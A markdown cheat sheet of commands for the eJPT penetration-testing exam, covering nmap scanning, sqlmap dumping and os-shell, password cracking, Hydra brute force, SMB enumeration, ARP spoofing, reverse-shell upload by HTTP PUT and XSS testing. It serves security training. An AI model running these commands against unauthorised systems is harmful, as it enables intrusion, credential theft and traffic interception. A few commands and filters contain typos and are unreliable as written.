# eJPT Cheat Sheets


Ports
-----------------------------------------
25 - SMTP
22 - SSH
110 - POP3
143 - IMAP
80 - HTTP
443 - HTTPS
137, 138, 139 - NETBIOS
115 - SFTP
23 - Telnet
21 - FTP
3389 - RDP
3306 - MySQL
1433 - MS SQL Server

Routing 
-----------------------------------------
```sh
ip route add <Network> via <GATEWAY>
ip route add 192.168.1.0/24 via 10.0.0.1 dev tap0
```
Wireshark Filters
-----------------------------------------

|Filter By|Command|
--- | --- |
|IP|ip.add == 10.10.10.9|
|Destination IP|ip.dest == 10.10.10.9|
|Source IP|ip.src == 10.10.50.1|
|port|tcp.port == 25|
|IP adress and PORT|ip.addr == 10.10.50.1 and tcp.port == 25|
|SYN flag|tcp.flags.syn == 1|
|Broadcast filter|eth.dst == ff:ff:ff:ff:ff:ff|

Ping Sweep
-----------------------------------------
```sh
nmap -sn <IP>/24
fping -a -g <IP>/24 2>/dev/null
```
Banner Grabbing
-----------------------------------------
```sh
nc -nv  <IP> <port>
```
Reverse shell
```sh
nc -nvlp <port>
```

Getting all the methods from a page
```sh
nc 10.10.10.10 80
OPTIONS / HTPP/1.0
```
Directory and File Scanning
-----------------------------------------
```sh
dirsearch.py -u <URL> -e *
gobuster dir -u <URL> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
dirb <URL>
dirb <URL> -u admin:admin
```
You can use the common.txt

Nmap 
-----------------------------------------
Port scan:
```sh
nmap -p- <IP address>
```
Version and script scanning:
```sh
nmap -sC -sV -p- <IP address>
```
Vuln scan:
```sh
nmap --script vuln <IP address>
```
*All Nmap script on this path :  /usr/share/nmap/scripts*

SQLMap
-----------------------------------------
```sh
sqlmap -u <URL> -p parameter
sqlmap -r port_request.req
sqlmap -u <URL>/login.php" --data="user=admin&password=admin"

sqlmap -u <URL> –os-shell

sqlmap -u <URL> –dump
```
Usefull parameters

Get database if injection Exists

 - --dbs
 
Get Tables

- -D dbname --tables

Get data in a Database tablee

- -D dbname -T table_name --dump



Cracking Password
-----------------------------------------
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
unshadow passwd shadow > unshadowed.txt

Hydra
-----------------------------------------
```sh
hydra -L users.txt -P pass.txt -t 10 <IP address> ssh -s 22
```
You can replace ssh with any service

HTTP POST Form
```sh
hydra <URL> http-post-form "/login.php:user=^USER^&password=^PASS^:Wrong password" -L usernames.txt -P passwords.txt -f -V
```

SMB Enumeration
-----------------------------------------
```sh
smbclient -L //<IP>/
enum4linux -a <IP>
nmap --script=smb-enum-users,smb-os-discovery,smb-enum-shares,smb-enum-groups,smb-enum-domains <IP> -p 135,139,445 -v
nmap -p445 --script=smb-vuln-* <IP> -v
```
Access Share
```sh
smbclient //<IP>/share_name
```

Metasploit
-----------------------------------------
Try not to use metasploit, it is not needed :)

ARPSpoof
-----------------------------------------
```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i tap0 -t <target IP> -r <arp ip>
```
FTP Enumeration
-----------------------------------------
```sh
nmap --script=ftp-anon <ip> -p21 -v
```
Login
```sh
ftp 10.10.10.10
```
Windows Command Line
-----------------------------------------
Check routing table
```cmd
route print
netstat -r
```
To search for a file
```cmd
dir /b/s "*.conf*"
dir /b/s "*.txt*"
dir /b/s "*filename*"
```
Check Users
```cmd
net users
```
List drives on the machine
```cmd
wmic logicaldisk get Caption,Description,providername
list volume
fsutil fsinfo drives
```

Uploading file to server using PUT
-----------------------------------------
```sh
wc -m reverse_shell.php
<Length of the shell> reverse_shell.php
```
```html
PUT /reverse_shell.php
Content-type: text/html
Content-length: <Length of the shell>
```

Cross Site Scripting (XSS)
-----------------------------------------

Just follow the videos from the INE

- Find a reflection point
- Test with <i> tag
- Test with HTML/JavaScript code (alert('XSS'))



















